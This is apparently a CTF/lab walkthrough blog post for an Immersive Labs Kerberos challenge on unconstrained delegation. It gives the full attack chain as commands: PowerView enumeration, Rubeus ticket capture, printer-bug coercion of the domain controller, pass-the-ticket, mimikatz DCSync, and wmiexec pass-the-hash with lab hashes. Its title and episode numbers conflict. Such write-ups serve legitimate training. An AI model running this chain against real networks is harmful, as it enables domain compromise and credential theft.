---
date: 2025-03-17
categories: [CTF, ImmersiveLabs]
title: "IML - Kerberos: Ep.9 – Active Directory Certificate Services"
tags: ['impacket', 'kerberos', 'mimikatz', 'powershell', 'privilege escalation', 'python', 'rce', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Kerberos Ep. 9 – Unconstraine - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Kerberos: Ep.12 – Active Directory Certificate Services
IML - Kerberos: Ep. 9 – Unconstrained Delegation


![image1](../resources/7f2555936ca4415aba773fa7bcc11a88.png)

![image2](../resources/5336fb7734cf44009120496934609a5d.png)

Use following command in powershell.exe to dot source the script first:

```bash
. .\Powerview_dev.ps1
```
**<u>Dot sourcing</u>**

The dot sourcing feature lets you run a script in the current scope instead of in the script scope. When you run a script that is dot sourced, the commands in the script run as though you had typed them at the command prompt

- On workstation-01 run Powerview:

```bash
. .\Powerview_dev.ps1

```

![image3](../resources/8ebb39d0918648d3b86f734d76c7d861.png)

- Enumerating for unconstrained delegation:

```bash
Get-DomainComputer -Unconstrained -Properties dnshostname

```

![image4](../resources/e7519f27495043109e63411a9c3ad29b.png)


![image5](../resources/bfb5d5b0d2a440a481f774ec27bfa45f.png)

<u>Exploiting unconstrained delegation:</u>
Now that you have access to a host with an unconstrained delegation set, you can force a privileged user to connect to the system. To do this, you'll need to use the MS-RPRN tool (aka spoolsample). This tool will force a DC account to connect to our hostname; in this case, Workstation-02

- Open an elevated command prompt and monitor for TGT **(Open in CMD not PS)**:

```bash
Rubeus.exe monitor /interval:1

```

![image6](../resources/bfc9a81bb20d4de08eeaa2e918811b97.png)

- To force a connection to our compromised host Workstation-02, you can use the MS-RPRN tool by running it on an elevated PowerShell prompt:

```bash
.\MS-RPRN.exe

.\MS-RPRN.exe \\DC01.krbtown.local \\Workstation-02.krbtown.local

```

![image7](../resources/680b6e010f0c4884b4948f09b0450e55.png)


![image8](../resources/ec4ff9197f54477684e68afcef95ed57.png)


![image9](../resources/53eb6570d2ea485591806990b9bd70e5.png)

- Since the host has an unconstrained delegation feature enabled, you can obtain a valid TGT to impersonate a DC account

- Copy the Base64 ticket and paste into Kali (ticket.txt):
**Remove empty lines and white spaces from the Base64 ticket before passing it through Rubeus:**

```bash
python3 -c 'f=open("ticket.txt").read();import re;print(re.sub(r"[\n\t\s]*", "", f))'

```
- Copy the output and paste into the command (on Windows):

(Convert from Base64 and saves it in **DC.kirbi**)

```powershell
[IO.File]::WriteAllBytes("C:\Users\m.oh\Desktop\Tools\DC.kirbi", [Convert]::FromBase64String("Base64 Ticket"))

```

![image10](../resources/e1433203f58b43c893bef66332ce4b21.png)

- Load the ticket into memory:

```bash
.\Rubeus.exe ptt /ticket:DC.kirbi

```

![image11](../resources/6c20fb63571042a6a69ed2f1ec95cecb.png)

- Check that it has been loaded in successfully:

```bash
klist

```

![image12](../resources/aa9591288001480688632c98b75ddc84.png)


![image13](../resources/aba65a0a932c4f859628f57061753344.png)


![image14](../resources/71f94ac080a24844b1622f1374fe491c.png)

- Open mimikatz:

```bash
lsadump::dcsync /user:krbtown\a.belridge

```

![image15](../resources/68b77d027e6d4eb9bd58e5dd8f0a56e1.png)

- Use wmiexec to gain access to the DC:

```bash
impacket-wmiexec [DOMAIN]/[USERNAME]@[TARGET] -hashes [LM-HASH]:[NT-HASH] 

impacket-wmiexec krbtown/a.belridge@10.102.110.227 -hashes 5bc77749d18b5076452c01b71eda19d0:a3352be00f83a3a7f86a8825e49d5011

```

![image16](../resources/654fc3178ff04959a0716fbc18c27eff.png)


![image17](../resources/1e43f17df0a24df894fe4b7ac6ddfd50.png)


![image18](../resources/e2146712bf5d408abb70a7acc7c1da8f.png)
